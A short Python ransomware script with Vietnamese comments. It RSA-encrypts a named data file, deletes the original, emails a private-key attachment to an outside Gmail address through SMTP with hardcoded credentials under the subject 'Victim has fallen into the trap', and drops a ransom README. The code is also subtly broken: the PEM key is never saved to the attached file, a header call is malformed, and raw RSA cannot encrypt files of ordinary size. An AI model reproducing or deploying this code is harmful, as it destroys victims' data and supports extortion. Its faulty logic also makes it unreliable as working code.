import os
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding


#tao private_key va public_key bang rsa
#public_exponent=65537: Thong thuong so mu cong khai 65537 cung goi la so mu ma hoa


private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

#file se ma hoa
input_file = 'dataquantrong.txt'
#file sau khi da ma hoa
output_file = 'dataquantrong.ecryptedQT'

#dung public key ma hoa du lieu trong file can ma hoa
with open(input_file, 'rb') as f:
    message = f.read()

encrypted = public_key.encrypt(
    message,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

with open(output_file, 'wb') as f:
    f.write(encrypted)  # Viet bytes ma hoa ra output file

pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
os.remove(input_file) # xoa file ban dau

#gui khóa bí mật về phái máy tấn công

fromaddr = "demomalware931@gmail.com"
toaddr = "vongnguyetvongnguyet@gmail.com"
msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Nạn nhân đã sập bẫy"
body = "Private key"

#file đính kèm
msg.attach(MIMEText(body, 'plain'))
filename = "private_key.txt"
attachment = open(filename, "rb")

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header(('Content-Disposition', 'attachment; filename = %s' % filename))
msg.attach(part)
server = smtplib.SMTP('smtp.gmail.com', 587) # python ucng cap thu vien smtplib su dung nhu mot smtp client de thuc hien gui mail

server.starttls()
server.login(fromaddr, 'demomalware123')
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text) #gui thu
attachment.close()
server.quit()

infor = open('README.txt', 'wb')
infor.write('File cua ba da bi ma hoa. Muon lay lai du lieu lien he ..........'.encode('utf-8'))